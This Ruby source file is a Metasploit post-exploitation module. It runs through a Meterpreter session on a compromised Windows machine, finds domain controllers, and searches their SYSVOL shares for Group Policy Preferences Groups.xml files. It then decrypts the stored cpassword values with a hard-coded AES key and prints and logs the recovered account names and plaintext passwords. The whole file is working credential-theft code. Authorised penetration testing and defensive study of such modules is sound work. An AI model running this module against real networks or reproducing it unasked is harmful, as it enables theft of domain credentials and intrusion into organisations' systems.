##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'rexml/document'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Group Policy Preferences Saved Password Extraction',
			'Description'   => %q{
				This module enumerates the victim machine's domain controller and
				connects to it via SMB. It then looks for Group Policy Preference XML 
				files containing local user accounts and passwords. It then parses the 
				XML files and decrypts the passwords.
				
				Users can specify DOMAINS="domain1 domain2 domain3 etc" to target specific
				domains on the network. This module will enumerate any domain controllers for
				those domains.
				
				Users can specify ALL=True to target all domains and their domain controllers
				on the network.

				This module must be run under a domain user or the user will not have appropriate
				permissions to read files from the domain controller(s).
			},
			'License'       => MSF_LICENSE,
			'Author'        =>[
				'TheLightCosine <thelightcosine[at]gmail.com>',
				'Meatballs <eat_meatballs[at]hotmail.co.uk>',
				'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
				'Rob Fuller <mubix[at]hak5.org>', #domain/dc enumeration code
				'Joshua Abraham <jabra[at]rapid7.com>' #enum_domain.rb code
				],
			'References'    => 
				[
					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences']
				],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
		
		register_options(
			[
				OptBool.new('CURRENT', [ false, 'Enumerate current machine domain.', true]),
				OptBool.new('ALL', [ false, 'Enumerate all domains on network.', false]),
				OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains - DOMAINS="domain1 domain2 etc".']),
			], self.class)
	end

	def run
		if is_system?
			print_error "This needs to be run as a Domain User, not SYSTEM"
			return nil
		end

		dcs = []
		paths = []
		
		if !datastore['DOMAINS'].to_s.empty?
			user_domains = datastore['DOMAINS'].to_s.split(' ')
			print_status "User supplied domains #{user_domains}"
			
			user_domains.each do |domain_name|
				found_dcs = enum_dcs(domain_name)
				dcs << found_dcs[0] unless found_dcs.to_a.empty?
			end
		elsif datastore['ALL']
			enum_domains.each do |domain|
				domain_name = domain[:domain]
				if  domain_name == "WORKGROUP" || domain_name.empty?
					print_status "Skipping '#{domain_name}'..."
					next
				end
				
				found_dcs = enum_dcs(domain_name) 
				# We only wish to enumerate one DC for each Domain.
				dcs << found_dcs[0] unless found_dcs.to_a.empty?
			end
		elsif datastore['CURRENT']
			dcs << get_domain_controller()
		else
			print_error "Invalid Arguments, please supply one of CURRENT, ALL or DOMAINS arguments"
			return nil
		end	

		dcs = dcs.flatten.compact
		dcs.each do |dc|
			print_status "Recursively searching for Groups.xml on #{dc}..."
			tmpath = "\\\\#{dc}\\SYSVOL\\"
			paths << find_paths(tmpath)
		end

		paths = paths.flatten.compact
		paths.each do |path|
			data, dc = get_xml(path)
			parse_xml(data, dc)
		end

	end

	def find_paths(path)
		paths=[]
		begin
			# Enumerate domain folders
			session.fs.dir.foreach(path) do |sub|
				next if sub =~ /^(\.|\.\.)$/
				tpath = "#{path}#{sub}\\Policies\\"
				print_status "Looking in domain folder #{tpath}"
				# Enumerate policy folders {...}
				session.fs.dir.foreach(tpath) do |sub2|
					next if sub2 =~ /^(\.|\.\.)$/
					tpath2 = "#{tpath}#{sub2}\\MACHINE\\Preferences\\Groups\\Groups.xml"
					begin
						paths << tpath2 if client.fs.file.stat(tpath2)
					rescue 
						next
					end
				end
			end
		rescue Rex::Post::Meterpreter::RequestError => e
			print_error "Received error code #{e.code} when reading #{path}"
		end
		
		return paths
	end

	def get_xml(path)
		begin
			groups = client.fs.file.new(path,'r')
			until groups.eof
				data = groups.read
			end
			
			domain = path.split('\\')[2] 
			return data, domain
		rescue
			print_status("The file #{path} either could not be read or does not exist")
		end
	end

	def parse_xml(data,domain_controller)
		mxml = REXML::Document.new(data).root
		mxml.elements.to_a("//Properties").each do |node|
			epassword = node.attributes['cpassword']
			next if epassword.to_s.empty?
			user = node.attributes['userName']
			newname = node.attributes['newName']
			disabled = node.attributes['acctDisabled']
			
			# Check if policy also specifies the user is renamed.
			if !newname.to_s.empty?
				user = newname
			end
			
			pass = decrypt(epassword)
			
			# UNICODE conversion
			pass = pass.unpack('v*').pack('C*')
			print_good("DOMAIN CONTROLLER: #{domain_controller} USER: #{user} PASS: #{pass} DISABLED: #{disabled}")
			
			if session.db_record
				source_id = session.db_record.id
			else
				source_id = nil
			end
			report_auth_info(
				:host  => session.sock.peerhost,
				:port => 445,
				:sname => 'smb',
				:proto => 'tcp',
				:source_id => source_id,
				:source_type => "exploit",
				:user => user,
				:pass => pass)
		end
	end

	def decrypt(encrypted_data)
		padding = "=" * (4 - (encrypted_data.length % 4))
		epassword = "#{encrypted_data}#{padding}"
		decoded = Rex::Text.decode_base64(epassword)
		key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
		aes.decrypt
		aes.key = key
		plaintext = aes.update(decoded)
		plaintext << aes.final

		return plaintext
	end

	def enum_domains
		print_status "Enumerating Domains on the Network..."
		domain_enum = 2147483648 # SV_TYPE_DOMAIN_ENUM =  hex 80000000
		buffersize = 500
		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
		
		# Estimate new buffer size on percentage recovered.
		percent_found = (result['entriesread'].to_f/result['totalentries'].to_f)
		buffersize = (buffersize/percent_found).to_i
		
		while result['return'] == 234
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
		end

		count = result['totalentries']
		print_status("#{count} domain(s) found.")
		startmem = result['bufptr']

		base = 0
		domains = []
		mem = client.railgun.memread(startmem, 8*count)
		count.times{|i|
				x = {}
				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
				nameptr = mem[(base + 4),4].unpack("V*")[0]
				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
				domains << x
				base = base + 8
			}
		return domains
	end

	def enum_dcs(domain)
		print_status("Enumerating DCs for #{domain}")
		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
		buffersize = 500
		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
		while result['return'] == 234
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
		end
		if result['totalentries'] == 0
			print_error "No Domain Controllers found for #{domain}"
			return nil
		end

		count = result['totalentries']
		startmem = result['bufptr']

		base = 0
		mem = client.railgun.memread(startmem, 8*count)
		hostnames = []
		count.times do |i|
			t = {}
			t[:platform] = mem[(base + 0),4].unpack("V*")[0]
			nameptr = mem[(base + 4),4].unpack("V*")[0]
			t[:dc_hostname] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
			base = base + 8
			print_good "DC Found: #{t[:dc_hostname]}"
			hostnames << t[:dc_hostname]
		end
		
		return hostnames
	end
	
	#enum_domain.rb
	def reg_getvaldata(key,valname)
		value = nil
		begin
			root_key, base_key = client.sys.registry.splitkey(key)
			open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
			v = open_key.query_value(valname)
			value = v.data
			open_key.close
		rescue
		end
		return value
	end

	def get_domain_controller()
		domain = nil
		begin
			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
			v_name = "DCName"
			domain = reg_getvaldata(subkey, v_name)
		rescue
			print_error "This host is not part of a domain."
		end
		return domain.sub!(/\\\\/,'')
	end
end
